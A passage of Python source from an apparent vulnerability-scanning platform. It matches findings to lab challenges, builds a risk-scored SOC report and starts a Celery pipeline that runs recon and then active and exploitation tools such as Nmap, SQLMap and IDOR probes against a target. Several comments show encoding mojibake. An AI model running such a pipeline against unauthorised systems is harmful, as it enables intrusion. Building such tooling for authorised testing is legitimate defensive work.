        "basket", "checkout", "profile", "payment", "upload", "download",
        "complaint", "tracking", "coupon", "invoice", "review",
        # New probe endpoints
        "b2b", "users", "encryptionkeys",
    }

    # Whitelist 3: precise vulnerability technique identifiers that are
    # sufficiently rare and specific to not appear in unrelated findings.
    _VULN_SPECIFIC: set = {
        "jwt", "deserialization", "xxe", "ssti", "ssrf", "ldap",
        "xpath", "nosql", "graphql", "prototype",
        # New probe types
        "reflected", "dom", "enumeration", "weak", "headers",
    }

    matched: List[Dict[str, Any]] = []
    for ch in challenges:
        name = (ch.get("name") or "").strip()
        if not name:
            continue

        tokens = {
            w.lower()
            for w in re.split(r"[\s\-'\"()\[\].,/]+", name)
            if w
        }

        app_kws  = tokens & _APP_SPECIFIC
        ep_kws   = tokens & _ENDPOINT_TERMS
        vuln_kws = tokens & _VULN_SPECIFIC

        # No whitelisted token in this challenge name -- skip entirely.
        if not (app_kws or ep_kws or vuln_kws):
            continue

        for f in real_findings:
            url   = (f.get("matched_at") or "").lower()
            title = (f.get("title")      or "").lower()

            # App-specific and vuln terms: match in URL or title.
            hit = next(
                (kw for kw in (app_kws | vuln_kws) if kw in url or kw in title),
                None,
            )

            # Endpoint terms: stricter -- URL must contain the term so we know
            # the scanner actually tested that specific route.
            if hit is None:
                hit = next((kw for kw in ep_kws if kw in url), None)

            if hit:
                matched.append({
                    "challenge_id":            ch.get("id"),
                    "challenge_name":          ch.get("name"),
                    "challenge_category":      ch.get("category"),
                    "matched_finding_id":      f.get("id"),
                    "matched_finding_title":   f.get("title"),
                    "matched_finding_sources": f.get("sources", []),
                    "matched_at":              f.get("matched_at", ""),
                    "matched_keyword":         hit,
                })
                break

    return matched


def _build_soc_report(
    target: str,
    scan_id: str,
    risk_report: Dict[str, Any],
    correlation_report: Dict[str, Any],
    ctx: PipelineContext,
    lab_mode: bool = True,
) -> Dict[str, Any]:
    risk_score = risk_report["final_score"]
    by_sev     = correlation_report.get("by_severity", {})
    total_f    = correlation_report.get("total_findings", 0)

    if risk_score >= 80:
        risk_level = "CRITICAL"
    elif risk_score >= 60:
        risk_level = "HIGH"
    elif risk_score >= 40:
        risk_level = "MEDIUM"
    elif risk_score >= 20:
        risk_level = "LOW"
    else:
        risk_level = "INFORMATIONAL"

    # a"EURa"EUR Retrieve all phase results from context a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
    shodan_data    = ctx.get_step_result("shodan")        or {}
    subfinder_data = ctx.get_step_result("subfinder")     or {}
    nmap_data      = ctx.get_step_result("nmap")          or {}
    vt_data        = ctx.get_step_result("virustotal")    or {}
    abuse_data     = ctx.get_step_result("abuseipdb")     or {}
    zap_data       = ctx.get_step_result("zap")           or {}
    nuclei_data    = ctx.get_step_result("nuclei")        or {}
    dalfox_data    = ctx.get_step_result("dalfox")        or {}
    ffuf_data      = ctx.get_step_result("ffuf")          or {}
    katana_data    = ctx.get_step_result("katana")        or {}
    gitleaks_data  = ctx.get_step_result("gitleaks")      or {}
    sqlmap_data    = ctx.get_step_result("sqlmap")        or {}
    idor_data      = ctx.get_step_result("idor")           or {}
    fp_data        = ctx.get_step_result("fp_reduction")  or {}
    auth_data      = ctx.get_step_result("auth_context")  or {}
    lab_data       = ctx.get_step_result("lab_challenges") or {}

    open_ports   = nmap_data.get("summary", {}).get("ports", [])
    abuse_conf   = abuse_data.get("data", {}).get("abuse_confidence_score", 0)
    secrets_crit = gitleaks_data.get("by_severity", {}).get("critical", 0)
    secrets_high = gitleaks_data.get("by_severity", {}).get("high", 0)
    secrets_total = gitleaks_data.get("total", 0)

    ffuf_by_sev   = ffuf_data.get("by_severity", {})
    ffuf_critical = len(ffuf_by_sev.get("critical", []))
    ffuf_high     = len(ffuf_by_sev.get("high", []))

    sqlmap_vuln   = sqlmap_data.get("vulnerable", False)
    sqlmap_skip   = sqlmap_data.get("skipped", False)

    # a"EURa"EUR Executive summary (enriched with Phase 3) a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
    idor_total = idor_data.get("total", 0)

    p3_extra = []
    if secrets_total > 0:
        p3_extra.append(f"{secrets_total} secret(s) exposed")
    if sqlmap_vuln:
        p3_extra.append(f"{sqlmap_data.get('total', 0)} SQL injection(s)")
    if ffuf_critical + ffuf_high > 0:
        p3_extra.append(f"{ffuf_critical + ffuf_high} sensitive path(s)")
    if idor_total > 0:
        p3_extra.append(f"{idor_total} IDOR/Broken Access Control confirmed")

    executive_summary = (
        f"Target {target} presents a {risk_level} risk (score: {risk_score}/100). "
        f"{total_f} correlated findings: "
        f"{by_sev.get('critical', 0)} critical, "
        f"{by_sev.get('high', 0)} high, "
        f"{by_sev.get('medium', 0)} medium. "
        + (f"Exploitation findings: {', '.join(p3_extra)}. " if p3_extra else "")
        + f"Exploitability: {risk_report.get('exploitability_score', 0):.0f}/100 | "
        f"Confidence: {risk_report.get('confidence_score', 0):.0f}%."
    )

    # a"EURa"EUR Top 10 findings sorted by severity then exploitability a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
    _sev_rank = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0, "informational": 0}
    sorted_findings = sorted(
        correlation_report.get("correlated_findings", []),
        key=lambda f: (
            _sev_rank.get(f.get("severity", "info"), 0),
            f.get("exploitability_score", 0),
        ),
        reverse=True,
    )
    top_findings = [
        {k: v for k, v in f.items() if k != "source_data"}
        for f in sorted_findings[:10]
    ]

    # a"EURa"EUR Recommendations (ordered by priority, enriched with Phase 3) a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
    recommendations: List[str] = []

    # Phase 3  --  exploitation findings first (highest priority)
    if idor_total > 0:
        idor_urls = [f.get("target_url", "") for f in idor_data.get("findings", [])[:2]]
        recommendations.append(
            f"CRITICAL: {idor_total} IDOR/Broken Access Control confirmed  --  "
            f"unauthorized cross-account data access at: {', '.join(idor_urls) or 'see IDOR findings'}. "
            "Implement server-side ownership checks on all resource endpoints"
        )
    if secrets_crit > 0:
        recommendations.append(
            f"CRITICAL: {secrets_crit} critical secret(s) exposed (API keys, private keys)  --  "
            "rotate immediately and audit access logs"
        )
    if sqlmap_vuln:
        sqli_params = ", ".join(sqlmap_data.get("vulnerable_params", [])[:5])
        recommendations.append(
            f"CRITICAL: SQL injection confirmed  --  parameter(s): {sqli_params or 'see findings'}. "
            "Apply parameterized queries immediately"
        )
    if secrets_high > 0:
        recommendations.append(
            f"HIGH: {secrets_high} high-severity secret(s) detected  --  audit and rotate affected credentials"
        )
    if ffuf_critical > 0:
        crit_urls = [ep.get("url", "") for ep in ffuf_by_sev.get("critical", [])[:3]]
        recommendations.append(
            f"CRITICAL: {ffuf_critical} critical path(s) exposed ({', '.join(crit_urls[:2]) or 'see FFUF findings'})  --  "
            "restrict access immediately"
        )
    if ffuf_high > 0:
        recommendations.append(
            f"HIGH: {ffuf_high} sensitive path(s) accessible (admin panels, config files)  --  "
            "restrict or remove from public access"
        )

    # Phase 1/2  --  standard vuln recommendations
    if by_sev.get("critical", 0) > 0:
        recommendations.append(
            "IMMEDIATE ACTION: Patch or isolate services with critical CVEs"
        )
    if by_sev.get("high", 0) > 0:
        recommendations.append(
            "URGENT (24-72h): Remediate high-severity findings"
        )

    risky_open = [p for p in open_ports if p in {23, 445, 3389, 5900, 6379, 27017, 1433}]
    if risky_open:
        recommendations.append(
            f"HIGH PRIORITY: Firewall or close high-risk exposed ports: {risky_open}"
        )

    if abuse_conf > 60:
        recommendations.append(
            "ALERT: IP actively flagged as malicious (AbuseIPDB)  --  investigate for compromise"
        )

    api_count = len(katana_data.get("api_endpoints", []))
    if api_count > 0:
        recommendations.append(
            f"MEDIUM: {api_count} API endpoint(s) discovered via JS crawling  --  "
            "verify authentication and authorization controls"
        )

    if risk_report.get("exploitability_score", 0) > 70:
        recommendations.append(
            "HIGH: Multiple exploitable services detected  --  prioritize patch management"
        )

    recommendations.append(
        "ONGOING: Enable continuous monitoring and schedule periodic rescans"
    )

    # a"EURa"EUR Phases summary  --  aligned on the 5-phase pipeline a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
    fp_reduction = correlation_report.get("fp_reduction", {})

    phases_summary = {
        "auth": {
            "phase":      "Auth Detection",
            "auth_type":  auth_data.get("auth_type", "none"),
            "detected":   auth_data.get("detected", False),
            "authenticated": auth_data.get("has_auth", False),
            "login_url":  auth_data.get("login_url"),
            "notes":      auth_data.get("notes", ""),
            "status":     "error" if auth_data.get("error") else "complete",
        },
        "phase_1_recon": {
            "phase":            "Phase 1  --  Recon",
            "tools":            ["Shodan", "Subfinder", "Nmap", "AbuseIPDB", "VirusTotal"],
            "status":           "error" if (nmap_data.get("error") and subfinder_data.get("error")) else "complete",
            # Shodan
            "shodan_ports":     len(shodan_data.get("data", {}).get("internetdb", {}).get("ports", [])),
            "shodan_cves":      len(shodan_data.get("data", {}).get("internetdb", {}).get("vulns", [])),
            # Subfinder / httpx
            "subdomains_found": subfinder_data.get("subdomains_count", 0),
            "live_hosts":       subfinder_data.get("live_count", 0),
            "technologies":     subfinder_data.get("technologies", []),
            # Nmap
            "open_ports":       len(open_ports),
            "hosts_found":      nmap_data.get("summary", {}).get("host_count", 0),
            "nmap_error":       nmap_data.get("error"),
            # Threat Intel
            "abuse_confidence": abuse_conf,
            "vt_malicious":     vt_data.get("data", {}).get("malicious", 0),
        },
        "phase_2_active_scan": {
            "phase":            "Phase 2  --  Active Scan",
            "tools":            ["OWASP ZAP", "Nuclei", "Dalfox"],
            "status":           "error" if (zap_data.get("error") and nuclei_data.get("error")) else "complete",
            # ZAP
            "zap_alerts":       zap_data.get("total", 0),
            "zap_high":         zap_data.get("by_risk", {}).get("High", 0),
            "zap_medium":       zap_data.get("by_risk", {}).get("Medium", 0),
            "zap_endpoints":    len(zap_data.get("endpoints", [])),
            "zap_error":        zap_data.get("error"),
            # Nuclei
            "nuclei_findings":  nuclei_data.get("total", 0),
            "nuclei_critical":  nuclei_data.get("by_severity", {}).get("critical", 0),
            "nuclei_high":      nuclei_data.get("by_severity", {}).get("high", 0),
            "max_cvss":         nuclei_data.get("max_cvss"),
            "nuclei_error":     nuclei_data.get("error"),
            # Dalfox
            "dalfox_xss":       dalfox_data.get("total", 0),
            "dalfox_error":     dalfox_data.get("error"),
        },
        "phase_3_exploitation": {
            "phase":            "Phase 3  --  Exploitation",
            "tools":            ["FFUF", "Katana", "GitLeaks", "SQLMap", "IDOR"],
            "status":           "complete",
            # FFUF
            "ffuf_total":       ffuf_data.get("total", 0),
            "ffuf_critical":    ffuf_critical,
            "ffuf_high":        ffuf_high,
            "ffuf_error":       ffuf_data.get("error"),
            # Katana
            "katana_endpoints": katana_data.get("total", 0),
            "katana_api":       api_count,
            "katana_error":     katana_data.get("error"),
            # GitLeaks
            "secrets_total":    secrets_total,
            "secrets_critical": secrets_crit,
            "secrets_high":     secrets_high,
            "gitleaks_error":   gitleaks_data.get("error"),
            # SQLMap
            "sqlmap_ran":       not sqlmap_skip,
            "sqlmap_vulnerable": sqlmap_vuln,
            "sqlmap_findings":  sqlmap_data.get("total", 0),
            "sqlmap_params":    sqlmap_data.get("vulnerable_params", []),
            "sqlmap_skip_reason": sqlmap_data.get("reason") if sqlmap_skip else None,
            "sqlmap_error":     sqlmap_data.get("error"),
            # IDOR
            "idor_ran":         not idor_data.get("skipped", True),
            "idor_confirmed":   idor_data.get("total", 0),
            "idor_findings":    idor_data.get("findings", []),
            "idor_skip_reason": idor_data.get("reason") if idor_data.get("skipped") else None,
            "idor_error":       idor_data.get("error"),
        },
        "phase_4_correlation": {
            "phase":            "Phase 4  --  Correlation",
            "tools":            ["Correlation Engine", "FP Reduction", "Risk Scoring"],
            "status":           "error" if correlation_report.get("error") else "complete",
            "total_correlated": total_f,
            "sources_used":     correlation_report.get("correlated_sources", []),
            "attack_paths":     len(correlation_report.get("attack_paths", [])),
            "service_vuln_map": len(correlation_report.get("service_vuln_map", {})),
            # FP Reduction
            "fp_original":      fp_data.get("original_count", 0),
            "fp_final":         fp_data.get("final_count", total_f),
            "fp_confirmed":     fp_reduction.get("confirmed", 0),
            "fp_suspicious":    fp_reduction.get("suspicious", 0),
            "fp_reduction_rate": fp_data.get("fp_reduction_rate", 0),
            # Risk Scoring
            "risk_score":       risk_score,
            "risk_level":       risk_level,
            "exploitability":   risk_report.get("exploitability_score", 0),
            "confidence":       risk_report.get("confidence_score", 0),
        },
        "phase_5_soc_dashboard": {
            "phase":            "Phase 5  --  SOC Dashboard",
            "tools":            ["SOC Report", "AI Analysis"],
            "status":           "complete",
            "top_findings_count": len(top_findings),
            "recommendations_count": len(recommendations),
            "attack_paths_count": len(correlation_report.get("attack_paths", [])),
        },
    }

    detected_challenges: List[Dict[str, Any]] = []
    matched_challenges: List[Dict[str, Any]] = []
    if lab_mode and lab_data.get("detected"):
        detected_challenges = [
            {
                "id":         ch.get("id"),
                "name":       ch.get("name"),
                "category":   ch.get("category"),
                "difficulty": ch.get("difficulty"),
                "solved":     ch.get("solved", False),
            }
            for ch in lab_data.get("challenges", [])
        ]
        matched_challenges = _match_lab_challenges(
            lab_data.get("challenges", []),
            correlation_report.get("correlated_findings", []),
        )
        logger.info(
            "[SOC] Lab challenges: %d detected, %d strict textual match(es)",
            len(detected_challenges),
            len(matched_challenges),
        )

    return {
        "scan_id":            scan_id,
        "target":             target,
        "risk_level":         risk_level,
        "risk_score":         risk_score,
        "detection_mode":     "Lab Challenge API enabled" if lab_mode else "Active detection only (no application-side hints)",
        "executive_summary":  executive_summary,
        "component_scores":   risk_report.get("component_scores", {}),
        "confidence_score":   risk_report.get("confidence_score", 0),
        "exploitability_score": risk_report.get("exploitability_score", 0),
        "threat_intelligence_factor": risk_report.get("threat_intelligence_factor", 0),
        "cve_severity_factor": risk_report.get("cve_severity_factor", 0),
        "service_exposure_factor": risk_report.get("service_exposure_factor", 0),
        "top_findings":       top_findings,
        "attack_paths":       correlation_report.get("attack_paths", []),
        "recommendations":    recommendations,
        "detected_challenges": detected_challenges,
        "matched_challenges":  matched_challenges,
        "phases_summary":     phases_summary,
        "generated_at":       datetime.utcnow().isoformat(),
    }


# a"EURa"EUR Fallback AI analysis (rule-based, no LLM needed) a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR


def _build_fallback_ai_analysis(
    target: str,
    risk_score: int,
    correlation_report: Dict[str, Any],
    soc_report: Dict[str, Any],
    reason: str = "",
) -> Dict[str, Any]:
    """
    Genere une analyse structuree sans LLM.
    Appele quand Gemini est indisponible, desactive, ou retourne une erreur.
    Ne retourne jamais N/A  --  utilise les findings correlates comme source.
    Produit la meme structure JSON qu'une vraie reponse IA.
    """
    by_sev       = correlation_report.get("by_severity", {})
    findings     = correlation_report.get("correlated_findings", [])
    confirmed    = [f for f in findings if f.get("fp_status") == "confirmed"]
    attack_paths = correlation_report.get("attack_paths", [])
    recs         = soc_report.get("recommendations", [])

    # Risk level from score
    if risk_score >= 80:   risk_level = "Critical"
    elif risk_score >= 60: risk_level = "High"
    elif risk_score >= 40: risk_level = "Medium"
    elif risk_score >= 20: risk_level = "Low"
    else:                  risk_level = "Informational"

    n_crit = by_sev.get("critical", 0)
    n_high = by_sev.get("high",     0)
    n_med  = by_sev.get("medium",   0)
    n_conf = len(confirmed)

    soc_summary = (
        f"Target {target}: {risk_level} risk (score {risk_score}/100). "
        f"{n_conf} confirmed finding(s)  --  critical: {n_crit}, high: {n_high}, medium: {n_med}. "
        + (f"Primary vector: {attack_paths[0][:120]}." if attack_paths else "No active attack paths.")
    )

    exec_summary = soc_report.get("executive_summary") or soc_summary

    # Top findings sorted by severity
    _rank = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0, "informational": 0}
    top = sorted(confirmed[:6], key=lambda f: _rank.get(f.get("severity", "info"), 0), reverse=True)
    top_vulns = []
    for i, f in enumerate(top, 1):
        sev  = f.get("severity", "info")
        port = f.get("affected_port", "")
        svc  = f.get("affected_service", "")
        component = f"{svc} port {port}".strip() if port else svc or f.get("matched_at", "")[:60]
        top_vulns.append({
            "rank":               i,
            "title":              f.get("title", "Unknown finding"),
            "severity":           sev,
            "cvss_score":         f.get("cvss_score"),
            "cve_ids":            f.get("cve_ids", []),
            "affected_component": component,
            "technical_explanation": (
                f.get("attack_path") or
                f"Detected by {', '.join(f.get('sources', []))}. See scan details."
            ),
            "business_impact": (
                "Potential unauthorized access, data exfiltration, or service disruption."
                if sev in ("critical", "high") else
                "Information disclosure or potential attack surface expansion."
            ),
            "remediation":        "Apply vendor patches and review service configuration.",
            "remediation_effort": "4h" if sev in ("critical", "high") else "1day",
            "priority":           "immediate" if sev == "critical" else "72h" if sev == "high" else "1week",
        })

    # Roadmap from SOC recommendations
    immediate = [r for r in recs if any(k in r for k in ("CRITICAL", "IMMEDIATE", "SQL", "secret"))][:3]
    urgent    = [r for r in recs if any(k in r for k in ("URGENT", "HIGH", "72h"))][:3]
    ongoing   = [r for r in recs if "ONGOING" in r][:2]

    return {
        "risk_level":          risk_level,
        "soc_summary":         soc_summary,
        "executive_summary":   exec_summary,
        "risk_score_analysis": (
            f"Score {risk_score}/100  --  rule-based derivation from {n_conf} confirmed findings "
            f"(AI analysis unavailable: {reason or 'no key or disabled'})."
        ),
        "attack_narrative": (
            attack_paths[0] if attack_paths else
            f"No exploitable attack chain identified for {target} in this scan."
        ),
        "attack_phases": [],
        "top_vulnerabilities": top_vulns,
        "remediation_roadmap": [
            {"phase": "Immediate (0-24h)",       "actions": immediate or ["Review critical findings immediately"]},
            {"phase": "Short-term (72h-1 week)", "actions": urgent    or ["Patch high-severity issues"]},
            {"phase": "Ongoing",                 "actions": ongoing   or ["Enable continuous monitoring"]},
        ],
        "compliance_violations": [],
        "headers_analysis":      "Manual review of security headers recommended.",
        "false_positive_assessment": (
            f"Rule-based classification: {n_conf} confirmed, "
            f"{len([f for f in findings if f.get('fp_status') == 'suspicious'])} suspicious."
        ),
        "detection_confidence": "medium",
        "model_used":           "rule-based-fallback",
        "provider":             "fallback",
        "fallback":             True,
        "fallback_reason":      reason or "AI analysis not available",
    }


# a"EURa"EUR Celery task a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR


@celery_app.task(
    bind=True,
    name="scan_tasks.run_scan",
    max_retries=3,
    default_retry_delay=30,
    soft_time_limit=2400,
    time_limit=2700,
    queue="default",
)
def run_scan(self, scan_id: str, credentials: Optional[Dict[str, Any]] = None, lab_mode: bool = True) -> Dict[str, Any]:
    from app.models.scan import Scan, ScanStatus
    from app.models.recon_result import ReconnaissanceResult
    from app.services.shodan_service import query_shodan
    from app.services.virustotal_service import query_virustotal
    from app.services.abuseipdb_service import query_abuseipdb
    from app.correlation_engine.correlator import correlate
    from app.risk_engine.scorer import compute_enhanced_risk_score
    from app.workers.pipeline_timer import PipelineTimer
    from app.workers.pipeline_logger import make_pipeline_logger
    from app.services.auth_detector import (
        detect_and_authenticate, AuthCredentials, AuthContext, AuthType,
    )

    db   = _get_db_session()
    r        = sync_redis.from_url(settings.REDIS_URL, decode_responses=True)
    loop     = asyncio.new_event_loop()
    ctx: Optional[PipelineContext] = None
    scan     = None
    lock_key: Optional[str] = None

    timer = PipelineTimer(scan_id, total_budget=3000, redis_client=r)
    plog  = make_pipeline_logger(scan_id, settings.REDIS_URL)

    try:
        scan = db.query(Scan).filter(Scan.id == uuid.UUID(scan_id)).first()
        if not scan:
            logger.error("Scan %s not found", scan_id)
            return {"error": "scan not found"}

        target   = scan.target
        lock_key = f"scan_lock:{target}"

        # a"EURa"EUR Anti-doublon : abandon si un scan tourne deja sur cette cible a"EURa"EURa"EURa"EUR
        if r.get(lock_key):
            existing = r.get(lock_key)
            logger.warning("[LOCK] Scan deja en cours sur %s (scan_id=%s)  --  abandon", target, existing)
            _update_scan(db, scan, status=ScanStatus.failed,
                         progress=0, current_phase="skipped_duplicate",
                         error_message=f"Un scan est deja en cours sur {target}. Veuillez attendre sa fin avant d'en lancer un nouveau.")
            return {"status": "skipped_duplicate", "reason": f"Scan already running on {target}"}
        r.set(lock_key, scan_id, ex=1500)

        ctx    = PipelineContext(scan_id, settings.REDIS_URL, db)

        logger.info(
            "[MODE] lab_mode=%s  --  %s",
            "ON" if lab_mode else "OFF",
            "Lab Challenge API activee" if lab_mode else "Detection 100% active (sans Lab API)",
        )
        plog.info(f"Scan started for target: {target}", tool="orchestrator")

        _update_scan(db, scan, status=ScanStatus.running, progress=0, current_phase="initializing")
        _publish(r, scan_id, "running", 0, "Scan pipeline started")
        _add_log(db, scan_id, f"Scan started for target: {target}")
        logger.debug("[BUILD-CHECK] pipeline SEQUENTIEL v2 actif")

        # PHASE 1  --  RECON
        _update_scan(db, scan, current_phase="recon", progress=2)
        _publish(r, scan_id, "running", 2,
                 "[Phase 1/5] Recon  --  Shodan || Subfinder || Nmap || AbuseIPDB || VirusTotal (parallel)...")
        _add_log(db, scan_id,
                 "a*a*a* Phase 1/5: Recon (Shodan || Subfinder || Nmap || AbuseIPDB || VirusTotal) a*a*a*")

        from app.services.agent_decision import _is_private_ip as _ip_is_private
        _is_internal_target = _ip_is_private(target)
        _INTEL_SKIP = {
            "skipped": True,
            "reason":  "internal_target_threat_intel_not_applicable",
            "data":    {},
        }

        async def _do_phase1():
            async def _safe_shodan():
                if _is_internal_target:
                    return _INTEL_SKIP.copy()
                try:
                    return await query_shodan(target)
                except Exception as exc:
                    return {"error": str(exc), "data": {}}

            async def _safe_vt():
                if _is_internal_target:
                    return _INTEL_SKIP.copy()
                try:
                    return await query_virustotal(target)
                except Exception as exc:
                    return {"error": str(exc), "data": {}}

            async def _safe_abuse():
                if _is_internal_target:
                    return _INTEL_SKIP.copy()
                try:
                    return await query_abuseipdb(target)
                except Exception as exc:
                    return {"error": str(exc), "data": {}}

            return await asyncio.gather(
                _safe_shodan(),
                _call_subfinder(target, timeout=90),
                _call_nmap(target),
                _safe_vt(),
                _safe_abuse(),
            )

        _p1_default = {"error": "phase1_timeout", "data": {}}
        try:
            (
                shodan_result, subfinder_result, nmap_result, vt_result, abuse_result
            ) = loop.run_until_complete(
                asyncio.wait_for(_do_phase1(), timeout=_PHASE1_MAX_SECONDS)
            )
        except asyncio.TimeoutError:
            logger.error("[P1] TIMEOUT GLOBAL %ds  --  phase interrompue, resultats partiels conserves", _PHASE1_MAX_SECONDS)
            _add_log(db, scan_id,
                     f"[P1] TIMEOUT GLOBAL {_PHASE1_MAX_SECONDS}s  --  recon interrompue, scan continue avec donnees partielles",
                     level="error")
            shodan_result    = _p1_default.copy()
            subfinder_result = {"error": "phase1_timeout", "subdomains": [], "total": 0}
            nmap_result      = {"error": "phase1_timeout", "data": {"hosts": []}}
            vt_result        = _p1_default.copy()
            abuse_result     = _p1_default.copy()

        # Log Shodan
        if shodan_result.get("skipped"):
            _add_log(db, scan_id, "[P1] Shodan: SKIPPED -- internal target, threat intel N/A")
        elif shodan_result.get("error"):
            _add_log(db, scan_id, f"[P1] Shodan error: {shodan_result['error']}", level="error")
        else:
            ports_found = len(shodan_result.get("data", {}).get("internetdb", {}).get("ports", []))
            vulns_found = len(shodan_result.get("data", {}).get("internetdb", {}).get("vulns", []))
            _add_log(db, scan_id,
                     f"[P1] Shodan: {ports_found} ports in public index"
                     + (f", {vulns_found} known CVEs" if vulns_found else ""))
        ctx.save_step_result("shodan", shodan_result)
        _update_scan(db, scan, shodan_data=shodan_result, progress=7)

        # Log Subfinder
        if subfinder_result.get("error"):
            _add_log(db, scan_id, f"[P1] Subfinder error: {subfinder_result['error']}", level="error")
        else:
            sub_count  = subfinder_result.get("subdomains_count", 0)
            live_count = subfinder_result.get("live_count", 0)
            techs      = subfinder_result.get("technologies", [])
            _add_log(db, scan_id,
                     f"[P1] Subfinder: {sub_count} subdomains | httpx: {live_count} live hosts"
                     + (f" | Tech: {', '.join(techs[:5])}" if techs else ""))
            for h in subfinder_result.get("live_hosts", [])[:5]:
                _add_log(db, scan_id, f"  [LIVE] {h}")
        ctx.save_step_result("subfinder", subfinder_result)
        _update_scan(db, scan, progress=11)

        # Log Nmap
        if nmap_result.get("error"):
            _add_log(db, scan_id, f"[P1] Nmap error: {nmap_result['error']}", level="error")
        else:
            summary    = nmap_result.get("summary", {})
            open_ports = summary.get("ports", [])
            cdn_note   = summary.get("cloud_note", "")
            _add_log(db, scan_id,
                     f"[P1] Nmap: {len(open_ports)} open ports, {summary.get('host_count', 0)} host(s)")
            if cdn_note:
                _add_log(db, scan_id, f"  [CDN] {cdn_note[:120]}", level="warning")
            svc_map = summary.get("services", {})
            for port_num in list(open_ports)[:10]:
                svc   = svc_map.get(str(port_num), {})
                techs = svc.get("technologies", [])
                _add_log(db, scan_id,
                         f"  Port {port_num}/{svc.get('protocol', 'tcp')}  --  "
                         f"{svc.get('name', 'unknown')} {svc.get('product', '')} {svc.get('version', '')}".strip()
                         + (f" | techs: {', '.join(techs[:3])}" if techs else ""))
        ctx.save_step_result("nmap", nmap_result)
        _update_scan(db, scan, nmap_data=nmap_result, progress=16)

        # Log VirusTotal
        if vt_result.get("skipped"):
            _add_log(db, scan_id, "[P1] VirusTotal: SKIPPED -- internal target, threat intel N/A")
        elif vt_result.get("error"):
            _add_log(db, scan_id, f"[P1] VirusTotal error: {vt_result['error']}", level="error")
        else:
            malicious = vt_result.get("data", {}).get("malicious", 0)
            _add_log(db, scan_id,
                     f"[P1] VirusTotal: {malicious} malicious detections",
                     level="warning" if malicious > 0 else "info")
        ctx.save_step_result("virustotal", vt_result)
        _update_scan(db, scan, virustotal_data=vt_result, progress=20)

        # Log AbuseIPDB
        if abuse_result.get("skipped"):
            _add_log(db, scan_id, "[P1] AbuseIPDB: SKIPPED -- internal target, threat intel N/A")
        elif abuse_result.get("error"):
            _add_log(db, scan_id, f"[P1] AbuseIPDB error: {abuse_result['error']}", level="error")
        else:
            conf_abuse = abuse_result.get("data", {}).get("abuse_confidence_score", 0)
            _add_log(db, scan_id,
                     f"[P1] AbuseIPDB: confidence score {conf_abuse}%",
                     level="error" if conf_abuse > 60 else "warning" if conf_abuse > 20 else "info")
        ctx.save_step_result("abuseipdb", abuse_result)
        _update_scan(db, scan, abuseipdb_data=abuse_result, progress=22)

        # a"EURa"EUR ThreatIntel enrichment for IPs discovered by Nmap a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
        discovered_ips = _extract_discovered_ips(nmap_result, target)
        if discovered_ips:
            _add_log(db, scan_id,
                     f"[P1] {len(discovered_ips)} additional IP(s) from Nmap: "
                     f"{', '.join(discovered_ips[:5])}")
            _add_log(db, scan_id,
                     f"[P1] ThreatIntel: enriching {len(discovered_ips[:5])} discovered IP(s)...")

            async def _enrich_discovered_ips():
                ips_slice   = discovered_ips[:5]
                vt_coros    = [query_virustotal(ip) for ip in ips_slice]
                abuse_coros = [query_abuseipdb(ip) for ip in ips_slice]
                return await asyncio.gather(*vt_coros, *abuse_coros, return_exceptions=True)

            enrichments   = loop.run_until_complete(_enrich_discovered_ips())
            n_ips         = len(discovered_ips[:5])
            discovered_vt:    Dict[str, Any] = {}
            discovered_abuse: Dict[str, Any] = {}
            for i, ip in enumerate(discovered_ips[:5]):
                vt_r    = enrichments[i]         if not isinstance(enrichments[i],         Exception) else {"error": str(enrichments[i])}
                abuse_r = enrichments[n_ips + i] if not isinstance(enrichments[n_ips + i], Exception) else {"error": str(enrichments[n_ips + i])}
                discovered_vt[ip]    = vt_r
                discovered_abuse[ip] = abuse_r
                if vt_r.get("data", {}).get("malicious", 0) > 0:
                    _add_log(db, scan_id, f"  VT {ip}: {vt_r['data']['malicious']} malicious", level="warning")
                ip_conf = abuse_r.get("data", {}).get("abuse_confidence_score", 0)
                if ip_conf > 20:
                    _add_log(db, scan_id, f"  AbuseIPDB {ip}: {ip_conf}%",
                             level="error" if ip_conf > 60 else "warning")
            vt_result["discovered"]    = discovered_vt
            abuse_result["discovered"] = discovered_abuse
            _update_scan(db, scan, virustotal_data=vt_result, abuseipdb_data=abuse_result)

        _update_scan(db, scan, progress=25)
        _publish(r, scan_id, "running", 25, "Phase 1/5  --  Recon complete [OK]")
        _add_log(db, scan_id, "Phase 1/5 complete [OK]")

        # PHASE 1.2  --  AGENT IA DE DECISION
        _add_log(db, scan_id, "a*a*a* Agent IA de decision  --  analyse contexte Nmap + headers a*a*a*")

        # Server headers (rapide, timeout 8s)  --  pour agent decision + tags Nuclei Phase 2
        server_tags_info = loop.run_until_complete(_fetch_server_tags(target, timeout=8))
        ctx.save_step_result("server_detection", server_tags_info)
        if server_tags_info.get("server") or server_tags_info.get("powered_by"):
            _add_log(db, scan_id,
